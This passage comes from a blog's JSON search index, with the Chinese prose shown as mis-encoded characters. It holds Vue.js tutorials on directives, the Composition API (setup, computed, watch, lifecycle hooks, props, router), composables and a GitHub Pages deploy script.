å¿…è£å¥—ä»¶(extensions)","link":"/2021/12/14/vs-code-shortcut/"},{"title":"Vueï¼åŸºæœ¬æ¶æ§‹èˆ‡æ‡¶äººåŒ…","text":"æ‡¶äººåŒ…ç¸½æ˜¯æœ€æ–¹ä¾¿çš„ã€‚ é€™é‚Šå…ˆé€é CDN æŠŠ Vue å¼•å…¥ï¼š 1&lt;script src=\"https://unpkg.com/vue@3.0.2\"&gt;&lt;/script&gt; æ¥è‘—å°±èƒ½é–‹å§‹å¯« JS äº†ï¼š 12345678910111213141516const app = Vue.createApp({ data() { return { message: 'Hello Vue', name: 'PeaNu', age: 20 } }, methods: { handleChangeMsg(newMessage) { this.message = newMessage } }})app.mount('#app') åªè¦é€é Vue çš„ createApp æˆ‘å€‘å°±èƒ½å»ºç«‹ä¸€å€‹å…ƒä»¶ï¼Œè£¡é¢æœƒå‚³å…¥ä¸€å€‹ç‰©ä»¶ä¾†å„²å­˜å…ƒä»¶çš„ dataã€methods ç­‰ç­‰ä¹‹é¡çš„æ±è¥¿ã€‚ app.mount å‰‡æ˜¯è®“æˆ‘å€‘ç”¨ä¾†å‘Šè¨´ Vue è¦æŠŠå…ƒä»¶ã€Œç¶å®šã€åˆ°å“ªä¸€å€‹å…ƒä»¶ä¸Šï¼ŸåŸºæœ¬ä¸Šç¶å®šå°±ç­‰æ–¼æŠŠã€Œæ§åˆ¶æ¬Šäº¤çµ¦ Vueã€ï¼Œæ‰€ä»¥ç¾åœ¨åªè¦æ˜¯åŒ…å«åœ¨ #app é€™å€‹è£¡çš„ HTML å…ƒç´ éƒ½æœƒè¢« Vue æ§åˆ¶ã€‚ åªæœ‰è¢« Vue æ§åˆ¶çš„å…ƒç´ æ‰å¯ä»¥ç”¨ã€Œv-directiveã€è·Ÿã€Œtemplateã€é€™äº›æ±è¥¿ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ Vue çš„èªæ³•ã€‚ é€™é‚Šåªæ˜¯å¸¶ä½ èªè­˜ä¸€äº›åŸºæœ¬çµæ§‹æ‰€ä»¥æ‰ç”¨ CDNï¼Œä¸ç„¶åŸºæœ¬ä¸Šç¾åœ¨è¦é–‹ç™¼ä¸€å€‹ Vue å°ˆæ¡ˆæ™‚æœƒé€éã€ŒVueï¼CLIã€ä¾†é–‹ç™¼æ¯”è¼ƒå¤šï¼Œé€™é»è¦æ³¨æ„ä¸€ä¸‹ã€‚ v-directive @event å»ºç«‹äº‹ä»¶ç›£è½ v-if / v-else æ¢ä»¶æ¸²æŸ“ï¼ˆæ“ä½œ DOM å…ƒç´ ï¼‰ v-show æ¢ä»¶æ¸²æŸ“ï¼ˆé€é CSS ä¾†æ§åˆ¶ displayï¼‰ v-for åˆ—è¡¨æ¸²æŸ“ï¼ˆè¦ç”¨ in æˆ– of éƒ½å¯ä»¥ï¼Œæ²’æœ‰å·®åˆ¥ï¼‰ v-slot:name å»ºç«‹å‘½å slot :attr å‹•æ…‹çš„å±¬æ€§å€¼ v-model è³‡æ–™èˆ‡ç•«é¢é›™å‘ç¶å®š modifier keyup.ctrl æŒ‰è‘— ctrl æ™‚æ‰æœƒ trigger v-model.trim å»æ‰é ­å°¾ç©ºç™½å­—å…ƒ keydown.prevent å–æ¶ˆé è¨­è¡Œç‚ºï¼ˆå¯ä»¥ç”¨ä¾†é¿å… enter é€å‡ºè¡¨å–®ï¼‰ é †é“ä¸€æé—œæ–¼ v-modal èƒŒå¾Œçš„æ©Ÿåˆ¶å…¶å¯¦åªæ˜¯é€™æ¨£ï¼š 1&lt;input type=\"email\" @input=\"email = $event.target.value\" :value=\"email\" /&gt; é€™å°±è·Ÿä½ åœ¨ React è£¡é¢æŠŠ value è·Ÿ state ç¶å†ä¸€èµ·ï¼Œæ¥è‘—å†ç”¨ onChange å»æ”¹è®Š state çš„é“ç†æ˜¯å·®ä¸å¤šçš„ã€‚åªæ˜¯ Vue ç¶å®šçš„äº‹ä»¶æœ‰é»ä¸åŒè€Œå·²ï¼ˆonInput æˆ– onChangeï¼‰ è·Ÿ $ æœ‰é—œçš„æ±è¥¿åŸºæœ¬ä¸Šåªè¦æ˜¯ $ é–‹é ­çš„æ±è¥¿éƒ½æ˜¯è¢«ç¶åœ¨ Vue çš„å¯¦é«”ä¸Šï¼Œæ‰€ä»¥æœƒéœ€è¦é€é this ä¾†å–å¾—ã€‚ $event ç”¨ä¾†å–å¾— Event ç‰©ä»¶ $ref ç”¨ä¾†å–å¾— DOM å…ƒç´  $emit ç”¨ä¾†è‡ªå®šç¾©äº‹ä»¶ $route ç”¨ä¾†å–å¾—è·¯ç”±è³‡è¨Š $router ç”¨ä¾†æ“ä½œè·¯ç”± ä¹Ÿå› ç‚ºå’Œ this æœ‰é—œï¼Œæ‰€ä»¥å¦‚æœæ˜¯å¯« Composition API çš„è©±åŸºæœ¬ä¸Šçœ‹ä¸å¤ªåˆ°è·Ÿ $ æœ‰é—œçš„æ±è¥¿ XD","link":"/2022/07/30/vue-basic/"},{"title":"Vueï¼Composition APIï¼ˆwatch & watchEffectï¼‰","text":"æœƒè®“äººæƒ³èµ· React çš„æ±è¥¿ã€‚ ç°¡è¿°watch çš„ç”¨æ³•å°±è·Ÿ options API ä¸­çš„ç”¨æ³•å·®ä¸å¤šï¼Œé€™é‚Šå°±ä¸å¤šè§£é‡‹ï¼Œä¸»è¦æœƒç‰¹åˆ¥ä»‹ç´¹çš„æ˜¯ watch Effectã€‚ é€™é‚Šå…ˆä¾†çœ‹æ®µ codeï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;template&gt; &lt;div class=\"home\"&gt; &lt;input type=\"text\" v-model=\"search\" placeholder=\"search\" /&gt; &lt;br /&gt; &lt;!-- æ›´æ–° search2 ä¸æœƒæœ‰ä»»ä½•æ•ˆæœ --&gt; &lt;input type=\"text\" v-model=\"search2\" placeholder=\"search2\" /&gt; &lt;br /&gt; &lt;button @click=\"onCancel\"&gt;Canel Watch &amp; Effect&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref, watch, watchEffect } from 'vue' export default { setup() { const search = ref('') const search2 = ref('') // å›å‚³å€¼ = stopHandler const stopWatchSearch = watch( search, (now, prev) =&gt; { console.log('run watch') console.log('new', now) console.log('old', prev) }, { deep: true } ) // å›å‚³å€¼ = stopHandler const stopWatchEffect = watchEffect(() =&gt; { console.log('run effect', search.value) }) const onCancel = () =&gt; { stopWatchSearch() stopWatchEffect() } return { search, search2, stopWatchSearch, onCancel } } }&lt;/script&gt; é™„è¨»ï¼šå¦‚æœæƒ³å¯¦éš›ç©ç©çœ‹çš„è©±èƒ½å¯ä»¥åˆ°é€™è£¡ã€‚ é€™å€‹ç¯„ä¾‹å…¶å¯¦æ˜¯ç”¨ watch å’Œ watchEffect å»ç›£è½ search å’Œ search.value çš„å€¼ï¼Œä¸éé€™å…©å€‹çš„è¡Œç‚ºæœ‰å¹¾å€‹å·®åˆ¥ï¼š watch åœ¨ç¬¬ä¸€æ¬¡ reder æ™‚ä¸æœƒè¢«åŸ·è¡Œï¼ŒwatchEffect æœƒ watch å¿…é ˆæ˜ç¢ºçš„æŒ‡å®šè¦ã€Œç›£è½å“ªå€‹å€¼ã€ä»–æ‰æœƒåšå‡ºåæ‡‰ï¼Œè€Œ watchEffect å‰‡æ˜¯æœƒè‡ªå‹•æ ¹æ“š callback æ‰€ã€Œç”¨åˆ°çš„å€¼ã€ä¾†åšå‡ºåæ‡‰ï¼ˆé€™é‚Šç”¨åˆ°çš„å€¼æ˜¯ search.valueï¼‰ å¦å¤–é€™å…©å€‹ hook éƒ½æœƒå›å‚³ä¸€å€‹ stopHandlerï¼Œæ˜¯æ‹¿ä¾†å–æ¶ˆ watch å’Œ watchEffect çš„æ•ˆæœã€‚ ç¸½è€Œè¨€ä¹‹ï¼ŒwatchEffect å°±è·Ÿ React useEffect æœ‰é»åƒï¼Œåªæ˜¯ Vue å·²ç¶“è‡ªå‹•å¹«ä½ è™•ç†å¥½ dependencies çš„å•é¡Œäº†ã€‚ Cleanup functioné€™é‚Šè¦é †ä¾¿æä¸€ä¸‹ watchEffect å…¶å¯¦æœ‰æä¾›ã€ŒClean upã€çš„åŠŸèƒ½ï¼Œç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š 123watchEffect((onCleanup) =&gt; { onCleanup(() =&gt; console.log('clean up'))}) å°±è·Ÿ React è£¡é¢çš„ cleanup function ä¸€æ¨£ï¼Œä»–æœƒåœ¨ unmount çš„æ™‚å€™åŸ·è¡Œã€‚","link":"/2022/08/16/vue-compisition-api-watch-and-watch-effect/"},{"title":"Vue ç‰ˆçš„ Custom Hookï¼Composables","text":"è·Ÿ React ä¸€æ¨£æ£’çš„åŠŸèƒ½ã€‚ ç°¡è¿°é€™å€‹åŠŸèƒ½æˆ‘è¦ºå¾—å°±è·Ÿ React çš„ Custom Hook å¹¾ä¹ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å°±ä¸è§£é‡‹å¤ªæ·±äº†ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠåŸæœ¬åœ¨ setup ä¸­çš„é‚è¼¯æŠ½å‡ºå»å¯«æˆã€Œä¸€å€‹ moduleã€ï¼Œæ¥è‘—å†åˆ°å…ƒä»¶ä¸­æ‹¿é€²ä¾†ç”¨å°±å¥½ã€‚ é€™ç¨®ä½œæ³•è¢«ç¨±ç‚ºã€ŒComposablesã€æˆ–ã€ŒComposition Functionã€ï¼Œä¸éé€™åªæ˜¯ä¸€ç¨®ä¿—ç¨±è€Œå·²ï¼Œä¸¦ä¸æ˜¯å®˜æ–¹å®šç¾©çš„åç¨±ã€‚ ç¸½ä¹‹å…ˆä¾†ä¸€æ®µå¸¸è¦‹çš„ fetch ç¯„ä¾‹ï¼š 12345678910111213141516171819202122232425&lt;script&gt; import { ref } from '@vue/reactivity' export default { setup() { const posts = ref([]) const error = ref(null) const getPosts = async () =&gt; { try { const response = await fetch('http://localhost:3000/posts') if (!response.ok) throw new Error('No data available') const data = await response.json() posts.value = data } catch (exception) { error.value = exception.message } } getPosts() return { posts, error } } }&lt;/script&gt; å¯«é React çš„ custom hook çš„è©±å°±æœƒçŸ¥é“ï¼Œæˆ‘å€‘é€™ä¸€æ®µå…¶å¯¦å¯ä»¥æŠ½å‡ºå»å¯«æˆä¸€å€‹ hookï¼Œåªè¦è¨˜å¾—åœ¨æœ€å¾ŒæŠŠ posts å’Œ error é€™å…©å€‹ã€Œstateã€çµ¦ return å‡ºä¾†å°±è¡Œäº†ã€‚ Vue ä¹Ÿæ˜¯åœ¨åšå·®ä¸å¤šçš„äº‹æƒ…ï¼Œæˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€æ”¯ src/composables/useFetchï¼Œç„¶å¾Œå¯«å…¥é€™æ¨£çš„å…§å®¹ï¼š é™„è¨»ï¼šé€™é‚Šçš„åç¨±åªæ˜¯å› ç‚ºæƒ³ä¸åˆ°æ›´å¥½çš„å‘½åè€Œåƒè€ƒ React hook çš„é¢¨æ ¼ï¼ŒVue è£¡é¢ä¸¦æ²’æœ‰è¦æ±‚è¦ use- ä¾†ç•¶å‰ç¶´å“¦ï¼Œä½ æƒ³å–å•¥éƒ½èƒ½ã€‚ 1234567891011121314151617181920212223import { ref } from 'vue'export const useFetch = (url) =&gt; { const data = ref([]) const error = ref(null) const getPosts = async () =&gt; { try { const response = await fetch(url) if (!response.ok) throw new Error('No data available') const json = await response.json() data.value = json } catch (exception) { error.value = exception.message } } // trigger when call this hook getPosts() // expose states return { data, error }} æ¥è‘—åŸæœ¬çš„æª”æ¡ˆå°±å¯ä»¥ç°¡åŒ–ç‚ºé€™æ¨£ï¼š 123456789101112&lt;script&gt; import { useFetch } from '@/composables/useFetch' export default { setup() { const url = 'http://localhost:3000/posts' const { data, error } = useFetch(url) // å¦‚æœæƒ³é‡æ–°å‘½åçš„è©±å¾—åœ¨é€™é‚Šã€Œè¼¸å‡ºã€çš„æ™‚å€™æ”¹æ‰è¡Œ return { posts: data, error: error } } }&lt;/script&gt;","link":"/2022/08/23/vue-composable/"},{"title":"Vueï¼Composition API å‰è¨€","text":"çµ‚æ–¼ä¾†äº†ã€‚ å¸Œæœ›è§£æ±º Options API çš„å¼Šç—… code æ•£è½å„åœ°ï¼Œç¼ºç™¼ç¾¤èšæ€§ï¼Œå¯è®€æ€§ä¹Ÿå·® åŒæ¨£çš„é‚è¼¯æ²’è¾¦æ³•è¢«é‡ç”¨ ç°¡å–®ä¾†èªª Composition API å¯ä»¥è®“ä½ çš„ code ç¾¤çµ„èµ·ä¾†ï¼Œä¹Ÿå¯¦ç¾äº†ã€ŒæŠŠé‚è¼¯æŠ½å‡ºå»ã€çš„åŠŸèƒ½ï¼Œæ›å¥è©±èªªå°±è·Ÿ React çš„ custom hook æ˜¯å¾ˆåƒå¾ˆåƒçš„æ¦‚å¿µï¼Œæ‰€ä»¥æ‰æœƒé€™éº¼å¤šäººæ„›ç”¨å®ƒã€‚ åŸºæœ¬ç”¨æ³•å…ˆä¾†çœ‹ code å†ä¾†è§£é‡‹ï¼š 12345678910111213141516171819202122&lt;template&gt; &lt;div class=\"home\"&gt; &lt;h2&gt;Home&lt;/h2&gt; &lt;p&gt;Hello, My Name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"onClick\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { setup() { let name = 'PeaNu' let age = 24 function onClick() { console.log('Clicked') } // é€™å€‹ return å¾ˆé‡è¦ return { name, age, onClick } } }&lt;/script&gt; è¦ä½¿ç”¨ Composition API çš„ç¬¬ä¸€æ­¥å°±æ˜¯å»ºç«‹ setup hookï¼Œä»–å…¶å¯¦å°±æ˜¯ä¸€å€‹ function è€Œå·²ï¼Œä¸éç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼ã€Œå¯ä»¥ç›´æ¥åœ¨è£¡é¢å¯« JavaScriptã€ã€‚ ä¸Šé¢å¯ä»¥çœ‹åˆ°åœ¨ setup ä¸­æˆ‘å¯ä»¥å»ºç«‹è®Šæ•¸æˆ–å‡½å¼ï¼Œé€™å€‹æ˜¯åœ¨ Options API ä¸­æ²’è¾¦æ³•åšåˆ°çš„äº‹æƒ…ã€‚ æ¥è‘—æœ€å¾Œå†ç”¨ return æŠŠæ±è¥¿çµ¦ä¸Ÿå‡ºå»ï¼Œé€™å€‹ç›®çš„æ˜¯ç‚ºäº†ï¼š è®“ template ä¸­èƒ½å¤ å­˜å– è®“ template ä¸­èƒ½å¤ å­˜å– è®“ template ä¸­èƒ½å¤ å­˜å– å¯«åˆ°é€™è£¡æ‡‰è©²æœƒç™¼ç¾é€™è·Ÿ React çš„ custom hook å¾ˆåƒï¼Œæˆ‘å€‘éƒ½æ˜¯æŠŠé‚è¼¯å°è£åœ¨ function å¾Œå†æŠŠå°æ‡‰çš„ state æˆ– method çµ¦ return å‡ºå»ï¼Œæ‰€ä»¥é€™é‚Šæ‡‰è©²ä¸é›£ç†è§£ç‚ºä»€éº¼èƒ½é€™æ¨£å­æ“ä½œã€‚ ç¸½ä¹‹é€™å€‹å°±æ˜¯æœ€åŸºæœ¬çš„ç”¨æ³•ï¼Œæ¥ä¸‹ä¾†æ˜¯å¹¾å€‹è£œå……çŸ¥è­˜ï¼š è§¸ç™¼æ™‚æ©Ÿsetup æ˜¯ç”Ÿå‘½é€±æœŸä¸­ã€Œæœ€å…ˆé–‹å§‹ã€è¢«åŸ·è¡Œçš„ hookï¼Œä¹Ÿå°±æ˜¯ createdã€beforeCreate éƒ½é‚„è¦å‰é¢ã€‚ ä½ å¯ä»¥è©¦è‘—æ‹¿é€™æ®µå»è·‘è·‘çœ‹å°±æ‡‚æ„æ€äº†ï¼š 123456789101112131415161718export default { setup() { console.log('settng...') let name = 'PeaNu' let age = 24 function onClick() { console.log('Clicked') } return { name, age, onClick } }, beforeCreate() { console.log('creating...') }, created() { console.log('created') }} å‡ºä¾†çš„é †åºä¸€å®šæ˜¯ï¼š settng... creating... created æˆ–ä¹Ÿå¯ä»¥å›å»è¤‡ç¿’ä¸€ä¸‹ Vueï¼ç”Ÿå‘½é€±æœŸ çš„é‚£å¼µåœ–ï¼Œè£¡é¢å¯ä»¥çœ‹åˆ° setup æœƒæ˜¯ç¬¬ä¸€å€‹è¢«åŸ·è¡Œçš„ hookã€‚ é è¨­ä¸å…·æœ‰ Reactive çš„åŠŸèƒ½é™„è¨»ï¼šé€™é‚Šæœ‰å¼·èª¿é€™æ˜¯ã€Œé è¨­ã€ï¼Œæ‰€ä»¥ä¸¦ä¸æ˜¯ç„¡æ³•åšåˆ°ï¼Œé€™é»è¦å…ˆææ¸…æ¥šã€‚ ç°¡å–®ä¾†èªªæˆ‘å€‘å¾ setup ä¸­å‚³å‡ºå»çš„è®Šæ•¸å°±ç®—è¢«ã€Œæ›´æ–°ã€äº†ï¼Œä¹Ÿä¸æœƒã€Œåæ‡‰ã€åœ¨ template ä¸Šï¼Œåƒé€™æ¨£ï¼š 12345678910&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, My Name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;export default { setup() { let name = 'PeaNu' let age = 24 return { name, age } }, methods: {changeName() { this.name = 'PPB' // é€™é‚Šçš„ log æœƒå°å‡º PPBï¼Œä½†ç•«é¢ä¸Šçš„ name ä¾ç„¶ç‚º PeaNuconsole.log(this.name) } } } æ‰€ä»¥é€™å€‹è·Ÿæˆ‘å€‘ç”¨ data ä¾†å»ºç«‹è³‡æ–™æ™‚æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œè¦ç‰¹åˆ¥ç•™æ„é€™é»ã€‚","link":"/2022/08/10/vue-composition-api-basic/"},{"title":"Vueï¼Composition APIï¼ˆComputedï¼‰","text":"æ‡¶äººåŒ…ã€‚ ç°¡è¿°å¯«å¾—è¶Šå¤šä½ å°±è¶Šæœƒç™¼ç¾éƒ½æ˜¯é€™å€‹ patternï¼šæƒ³è¦ä»€éº¼å°±æ‹¿å‡ºä¾†ç”¨ æ‰€ä»¥ Computed ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œç›´æ¥çœ‹ç¯„ä¾‹å°±æ‡‚äº†ï¼š 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div class=\"home\"&gt; &lt;input type=\"text\" v-model=\"search\" /&gt; &lt;p&gt;Search term - {{ search }}&lt;/p&gt; &lt;ul&gt; &lt;li v-for=\"name of matchingNames\" :key=\"name\"&gt;{{ name }}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // æŠŠ computed æ‹¿å‡ºä¾†ç”¨ import { computed, reactive, ref } from 'vue' export default { setup() { const names = ref(['mario', 'jojo', 'dio', 'luigi', 'koopa', 'peanu', 'ppb', 'joslon']) const search = ref('') const matchingNames = computed(() =&gt; names.value.filter((name) =&gt; name.includes(search.value)) ) return { names, search, matchingNames } } }&lt;/script&gt; é€™æ˜¯ä¸€å€‹æœå°‹çš„åŠŸèƒ½ï¼ŒmatchingNames å°±æ˜¯æ ¹æ“šé—œéµå­—æœå°‹å¾Œçš„çµæœã€‚","link":"/2022/08/14/vue-composition-api-computed/"},{"title":"Vueï¼Composition APIï¼ˆLife Cycle Hooksï¼‰","text":"åˆè¦‹é¢äº†ã€‚ ç°¡è¿°åœ¨ setup ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ Lifecycle hooksï¼Œå”¯ä¸€çš„å·®åˆ¥å°±æ˜¯å¤šäº† on- é€™å€‹å‰ç¶´ï¼Œä¾‹å¦‚ mounted -&gt; onMounted ã€‚ é€™é‚Šé™„è´ˆä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ã€‚ Home.vueï¼š 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- è§¸ç™¼ onUnmounted --&gt; &lt;router-link :to=\"{ name: 'About' }\"&gt;About&lt;/router-link&gt; &lt;!-- è¼¸å…¥æ™‚è§¸ç™¼ onUpdated --&gt; &lt;input type=\"text\" v-model=\"input\" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref } from '@vue/reactivity' import { onMounted, onUnmounted, onUpdated } from '@vue/runtime-core' export default { setup() { onMounted(() =&gt; console.log('mounted')) onUpdated(() =&gt; console.log('updated')) onUnmounted(() =&gt; console.log('unmounted')) const input = ref('') return { input } } }&lt;/script&gt; æ‡‰è©²ä¸é›£ç†è§£ï¼ŒçœŸçš„æœ‰ç–‘å•çš„è©±åˆ° é€™é‚Š ç©ç©çœ‹å§ã€‚","link":"/2022/08/18/vue-composition-api-life-cycle/"},{"title":"Vueï¼Composition APIï¼ˆPropsï¼‰","text":"å°çŸ¥è­˜ã€‚ ç°¡è¿°è¦åœ¨ setup ä¸­å­˜å– props çš„æ–¹å¼å¾ˆç°¡å–®ï¼Œå°±æ˜¯é€é setup(props) ä¾†æ‹¿åˆ°é€™å€‹åƒæ•¸å°±è¡Œäº†ã€‚ ä¾†çœ‹ä¸€å€‹ç¯„ä¾‹ï¼Œå‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹é é¢é•·é€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div class=\"home\"&gt; &lt;div v-for=\"post of posts\" :key=\"post.title\"&gt; &lt;!-- å‚³å…¥ props --&gt; &lt;SinglePost :post=\"post\" /&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import SinglePost from '../components/SinglePost.vue' export default { components: { SinglePost }, setup() { const posts = [ { title: 'CSS Top 5 tricks', body: 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sunt culpa nulla harum officia vitae. Fugit deserunt similique neque? Molestias, enim! Quidem obcaecati esse blanditiis dicta facilis voluptate magni non similique!' }, { title: 'TypeScript Tutorial', body: 'Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sunt culpa nulla harum officia vitae. Fugit deserunt similique neque? Molestias, enim! Quidem obcaecati esse blanditiis dicta facilis voluptate magni non similique!' } ] return { posts } } }&lt;/script&gt; é€™é‚Šæƒ³è¦æŠŠ posts ç•¶æˆ props å‚³çµ¦ &lt;SinglePost /&gt;ï¼Œä¾†çœ‹è¦æ€éº¼åšï¼š 12345678910111213141516171819&lt;template&gt; &lt;div class=\"post-list\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ bodySnippet }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { computed } from '@vue/runtime-core' export default { // é€™å€‹ä¸€æ¨£è¦å¯«å‡ºä¾†ï¼Œtemplate æ‰æœ‰è¾¦æ³•ç”¨ props: ['post'], // æ¥æ”¶ props setup(props) { const bodySnippet = computed(() =&gt; props.post.body.substring(0, 100) + '...') return { bodySnippet } } }&lt;/script&gt; é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ props å±¬æ€§çš„éƒ¨åˆ†ï¼Œå¦‚æœæ˜¯ &lt;template&gt; æœƒç”¨åˆ°çš„ã€Œé‚£ç¨® propsã€çš„è©±å°±å¾—åˆ—å‡ºä¾†ï¼Œåä¹‹å‰‡ä¸ç”¨ï¼ˆä¸éæ‡‰è©²å¾ˆå°‘é€™ç¨®æƒ…æ³å•¦ï¼‰ã€‚","link":"/2022/08/17/vue-composition-api-props/"},{"title":"Vueï¼Composition APIï¼ˆuseRouter & useRouteï¼‰","text":"å¾ˆ hook çš„å‘³é“ã€‚ useRouter &amp; useRouteä»¥å¾€åœ¨ç”¨ Options API æ§åˆ¶è·¯ç”±çš„æ™‚å€™æˆ‘å€‘æœƒé€™æ¨£å¯«ï¼š 1234567891011methods: { gonback() { this.$router.go(-1) }, goForward() { this.$router.go(1) }, redirect() { this.$router.push('/') }} ä¸éåœ¨ Composition API ä¸­å› ç‚º setup æ²’è¾¦æ³•å­˜å–åˆ° this çš„é—œä¿‚ï¼Œæ‰€ä»¥å¾—æ”¹ç”¨ useRouter å’Œ useRoute é€™å…©å€‹ hook ä¾†åšï¼Œç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š 12345678910111213141516171819202122&lt;script&gt; import { useRouter } from 'vue-router' export default { setup() { // get router instance const router = useRouter() function goBack() { router.go(-1) } function goForward() { router.go(1) } function redirect() { router.push('/') } return { goBack, goForward, redirect } } }&lt;/script&gt; 123456789101112&lt;script&gt; import { useRoute } from 'vue-router' export default { setup() { // get route instance const route = useRoute() // get params id console.log(route.params.id) } }&lt;/script&gt; ç¸½ä¹‹é€™å°±æ˜¯åœ¨ setup ä¸­å­˜å–è·¯ç”±çš„æ–¹å¼ï¼Œä¸å¾—ä¸èªªé‚„ä»¥ç‚ºæˆ‘åœ¨å¯« React å‘¢ XD","link":"/2022/08/24/vue-composition-api-router/"},{"title":"Vueï¼å¯ä»¥å¹«æˆ‘è¨˜ä½é€™å€‹å€¼å—ï¼Ÿï¼ˆComputedï¼‰","text":"æœƒè »å¸¸ç”¨åˆ°çš„åŠŸèƒ½ã€‚ å¯«é React çš„äººå¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯é¡ä¼¼ useMemo çš„æ¦‚å¿µã€‚useMemo çš„ç”¨é€”æ˜¯ç”¨ä¾†ã€Œè¨˜ä½ function çš„å›å‚³å€¼ã€ï¼Œä½†ä¸ä¸€æ¨£çš„åœ°æ–¹æ˜¯ Vue æœƒè‡ªå·±åˆ¤å®šé€™å€‹å€¼ä»€éº¼æ™‚å€™è©²é‡æ–°è¨ˆç®—ï¼Œä¸åƒæˆ‘å€‘å¯« React çš„æ™‚å€™é‚„è¦è‡ªå·±å®šç¾© dependenciesã€‚ æˆ‘å€‘é€šå¸¸ç”¨å®ƒä¾†å° data ä¸­çš„è³‡æ–™åšè™•ç†ï¼Œæœ€å¸¸è¦‹çš„ä¾‹å­æ˜¯ filterï¼š 12345678910111213141516171819202122const app = Vue.createApp({ data() { return { users: [ { name: 'PeaNu', age: 25, img: './assets/chung.jpeg', isOnline: true }, { name: 'PPB', age: 24, img: './assets/ppb.png', isOnline: true }, { name: 'ET', age: 999, img: './assets/badguy.jpeg', isOnline: false } ] } }, methods: { toggleOnline(name) { this.users = this.users.map((u) =&gt; (u.name === name ? { ...u, isOnline: !u.isOnline } : u)) } }, computed: { // åªç•™ä¸‹åœ¨ç·šä¸Šçš„ user onlineUsers() { return this.users.filter((u) =&gt; u.isOnline) } }}) åªè¦ this.users çš„å€¼æ²’æœ‰æ”¹è®Šï¼ŒonlineUsers å°±æ°¸é ä¸æœƒè¢«é‡æ–°è¨ˆç®—ã€‚ å¦å¤–è¦æ³¨æ„çš„ä¸€ä»¶äº‹æƒ…æ˜¯ï¼š å¦‚æœ template ä¸­æ²’æœ‰ç”¨åˆ° computed çš„è©±å°±ä¸æœƒåŸ·è¡Œ å¦‚æœ template ä¸­æ²’æœ‰ç”¨åˆ° computed çš„è©±å°±ä¸æœƒåŸ·è¡Œ å¦‚æœ template ä¸­æ²’æœ‰ç”¨åˆ° computed çš„è©±å°±ä¸æœƒåŸ·è¡Œ é€™ç®—æ˜¯æˆ‘è‡ªå·± debug æ™‚è¸©åˆ°çš„é›·å§ï¼Œåªæ˜¯é †ä¾¿æä¸€ä¸‹ã€‚","link":"/2022/07/31/vue-computed/"},{"title":"Vueï¼éƒ¨ç½²åˆ° GitHub ä¸Šçš„æ–¹æ³•","text":"ç°¡å–®ç´€éŒ„ã€‚ ç°¡è¿°è©³ç´°å¯ä»¥åƒè€ƒé€™ä»½ å®˜æ–¹æ–‡ä»¶ï¼Œé€™é‚Šåªæœƒç°¡å–®å¸¶ä¸€ä¸‹æ­¥é©Ÿã€‚ é¦–å…ˆå»è¨­å®š vue.config.js.ï¼Œèª¿æ•´ public çš„æª”æ¡ˆè·¯å¾‘ï¼š 123456module.exports = { publicPath: process.env.NODE_ENV === 'production' ? '/my-project/' // production : '/' // development} æ¥è‘—åœ¨å¯«ä¸€ä»½ shell script ä¾†è™•ç†å°±å¥½ï¼ŒåŸç†çš„è©±çœ‹è¨»è§£æ‡‰è©²å°±æ‡‚äº†ï¼š 12345678910111213141516171819#!/usr/bin/env sh# å½“å‘ç”Ÿé”™è¯¯æ—¶ä¸­æ­¢è„šæœ¬set -e# æ„å»ºnpm run build# cd åˆ°æ„å»ºè¾“å‡ºçš„ç›®å½•ä¸‹cd distgit initgit add -Agit commit -m 'deploy'# éƒ¨ç½²åˆ° https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;git push -f https://github.com/{username}/{project-name}.git master:gh-pagescd -","link":"/2022/07/28/vue-deploy/"},{"title":"Vueï¼å‹•æ…‹ class å€¼","text":"å‡¡äº‹éƒ½è¦å‹•æ…‹ã€‚ ç°¡è¿°å‡è¨­æˆ‘çš„å…ƒä»¶è³‡æ–™é•·é€™æ¨£ï¼š 1234567891011const app = Vue.createApp({ data() { return { users: [ { name: 'PeaNu', age: 25, img: './assets/chung.jpeg', isOnline: false }, { name: 'PPB', age: 24, img: './assets/ppb.png', isOnline: true }, { name: 'ET', age: 999, img: './assets/badguy.jpeg', isOnline: false } ] } }}) æˆ‘å¸Œæœ›åœ¨ isOnline æ˜¯ true çš„æ™‚å€™åŠ ä¸Šç‰¹å®šçš„ classï¼Œå¯ä»¥ç”¨é€™ç¨®æ–¹å¼ä¾†å¯«ï¼š 1234567891011121314&lt;div id=\"app\"&gt; &lt;ul&gt; &lt;!-- user.isOnline = true æ™‚åŠ ä¸Š online é€™å€‹ class --&gt; &lt;li 